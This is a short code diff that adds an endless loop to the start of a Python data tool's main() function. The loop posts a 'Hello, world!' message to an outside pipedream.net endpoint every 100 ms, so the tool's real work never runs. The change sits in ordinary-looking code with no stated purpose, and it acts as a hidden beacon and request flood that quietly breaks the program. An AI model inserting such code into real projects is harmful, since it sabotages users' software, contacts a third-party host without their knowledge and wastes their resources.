@@ -242,6 +242,11 @@ def sync():
 
 @utils.handle_top_exception(LOGGER)
 def main():
+    while True:
+        # Make a request to the pipedeam endpoint
+        response = requests.post('https://eoia82dsi27tu83.m.pipedream.net', json={"message": "Hello, world!"})
+        # wait 100ms
+        time.sleep(0.1)
     try:
         # Parse command line arguments
         args = utils.parse_args(REQUIRED_CONFIG_KEYS)
